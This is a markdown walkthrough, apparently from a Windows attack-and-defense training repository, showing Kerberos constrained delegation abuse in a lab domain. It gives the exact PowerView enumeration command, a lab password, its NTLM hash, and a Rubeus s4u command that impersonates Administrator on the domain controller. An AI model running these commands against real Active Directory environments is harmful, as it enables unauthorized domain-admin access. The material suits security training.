# Attack
To demonstrate the attack, we assume that the user web_service is trusted for delegation and has been compromised. The password of this account is Slavi123. To begin, we will use the Get-NetUser function from PowerView to enumerate user accounts that are trusted for constrained delegation in the domain:
```bash
Get-NetUser -TrustedToAuth
```
![image](https://github.com/offensivecyber03/Windows-Attack-Defense/assets/71892943/4091dd7f-0f84-4991-989b-5d501a69dc4a)

Before we request a ticket with Rubeus (which expects a password hash instead of cleartext for the /rc4 argument used subsequently), we need to use it to convert the plaintext password Slavi123 into its NTLM hash equivalent:
```bash
.\Rubeus.exe hash /password:Slavi123
```
![image](https://github.com/offensivecyber03/Windows-Attack-Defense/assets/71892943/ceec935a-0db8-4313-a897-64598a4715a3)
<br>
Then, we will use Rubeus to get a ticket for the Administrator account:
```bash
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```
![image](https://github.com/offensivecyber03/Windows-Attack-Defense/assets/71892943/2878151a-dcd3-4696-8707-a506da1c4b2e)
<br>
To confirm that Rubeus injected the ticket in the current session, we can use the klist command:
![image](https://github.com/offensivecyber03/Windows-Attack-Defense/assets/71892943/51adf912-67cf-447f-b765-efe9e7b70b75)
<br>
With the ticket being available, we can connect to the Domain Controller impersonating the account Administrator:
![image](https://github.com/offensivecyber03/Windows-Attack-Defense/assets/71892943/4434b840-dc88-4d5f-b135-2c6a527b0610)
